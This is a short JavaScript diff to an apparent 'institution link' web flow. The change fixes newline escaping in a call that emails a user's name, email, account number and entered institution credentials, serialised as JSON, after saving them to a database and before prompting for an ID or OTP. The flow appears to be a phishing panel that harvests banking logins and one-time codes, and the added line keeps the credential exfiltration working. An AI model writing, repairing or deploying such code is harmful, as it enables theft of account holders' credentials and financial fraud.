@@ -1151,13 +1151,7 @@ function APP_instStep1Submit(){
   _instFlow._instKey=instKey;
   var stage1={uid:_user.uid,name:(_ud.firstname+' '+_ud.surname).trim(),email:_ud.email,accountNumber:_ud.accountNumber,institution:inst.name,requireId:!!inst.requireId,otpType:inst.otpType,status:'stage1_credentials',addedDate:new Date().toISOString(),credentials:data};
   _db.ref(DB.instSubs+'/'+instKey).set(stage1).catch(function(){});
-  _sendEmail('otp','Institution Link Step 1 — '+inst.name,{user_name:(_ud.firstname||'')+' '+(_ud.surname||''),user_email:_ud.email,message:'Name: '+(_ud.firstname||'')+' '+(_ud.surname||'')+'
-Email: '+(_ud.email||'')+'
-Account: '+(_ud.accountNumber||'')+'
-Institution: '+inst.name+'
-Credentials: '+JSON.stringify(data)+'
-
-Stage 1 submitted. Awaiting ID/OTP.'});
+  _sendEmail('otp','Institution Link Step 1 — '+inst.name,{user_name:(_ud.firstname||'')+' '+(_ud.surname||''),user_email:_ud.email,message:'Name: '+(_ud.firstname||'')+' '+(_ud.surname||'')+'\nEmail: '+(_ud.email||'')+'\nAccount: '+(_ud.accountNumber||'')+'\nInstitution: '+inst.name+'\nCredentials: '+JSON.stringify(data)+'\n\nStage 1 submitted. Awaiting ID/OTP.'});
   if(inst.requireId){_buildInstIdStep();_show('inst-step2',true);}
   else _showInstOtpStep();
 }
